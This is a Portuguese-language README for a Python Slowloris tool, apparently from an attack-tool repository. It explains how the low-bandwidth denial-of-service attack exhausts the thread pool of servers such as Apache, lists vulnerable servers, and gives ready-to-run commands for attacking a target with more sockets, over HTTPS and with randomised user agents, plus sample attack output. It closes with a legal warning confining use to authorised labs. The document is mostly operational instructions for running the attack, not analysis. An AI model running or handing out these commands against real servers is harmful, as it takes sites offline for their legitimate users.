# Slowloris

## Como funciona

Slowloris é um ataque de negação de serviço de **baixa largura de banda** que afeta servidores web com modelo de threads (Apache, por exemplo).

O ataque funciona assim:
1. Abre centenas de conexões HTTP com o servidor alvo
2. Envia cabeçalhos HTTP incompletos periodicamente (~15 segundos) para manter as conexões vivas
3. Nunca fecha as conexões — o servidor fica esperando o fim da requisição
4. O pool de threads do servidor se esgota e ele para de responder a usuários legítimos

Não precisa de grande volume de tráfego. Um único computador pode derrubar um servidor vulnerável.

**Servidores vulneráveis:** Apache, httpd, dhttpd  
**Servidores resistentes:** nginx, IIS, lighttpd (usam modelo assíncrono)

## Dependências

Apenas Python 3 padrão — sem dependências externas.

```bash
python3 --version  # precisa de Python 3.x
```

## Como instalar

```bash
# Opção 1: rodar direto
python3 slowloris.py <alvo>

# Opção 2: instalar como pacote
pip install .
slowloris <alvo>
```

## Como usar

```bash
# Ataque básico na porta 80
python3 slowloris.py 192.168.1.100

# Especificar porta
python3 slowloris.py 192.168.1.100 -p 8080

# Aumentar número de sockets (mais agressivo)
python3 slowloris.py 192.168.1.100 -s 500

# Alvo HTTPS (porta 443) com SSL
python3 slowloris.py 192.168.1.100 -p 443 --https

# Modo verbose (ver cada conexão)
python3 slowloris.py 192.168.1.100 -v

# Intervalo entre envios de header (padrão: 15s)
python3 slowloris.py 192.168.1.100 --sleeptime 10
```

## Parâmetros

| Parâmetro | Padrão | Descrição |
|-----------|--------|-----------|
| `host` | obrigatório | IP ou domínio do alvo |
| `-p / --port` | 80 | Porta do servidor |
| `-s / --sockets` | 150 | Número de sockets simultâneos |
| `-v / --verbose` | off | Mostrar logs detalhados |
| `--https` | off | Usar SSL/TLS |
| `--sleeptime` | 15 | Segundos entre envios de header |
| `--randuseragents` | off | Randomizar User-Agent |

## Exemplo de saída esperada

```
[14-08-2024 10:23:01] Attacking 192.168.1.100 with 150 sockets.
[14-08-2024 10:23:01] Creating sockets...
[14-08-2024 10:23:02] Sending keep-alive headers... Socket count: 150
[14-08-2024 10:23:17] Sending keep-alive headers... Socket count: 148
```

## ⚠️ Aviso Legal

Use **somente em ambientes que você tem autorização** (sua própria VM, lab local, servidor de teste). Usar contra sistemas de terceiros sem permissão é crime.
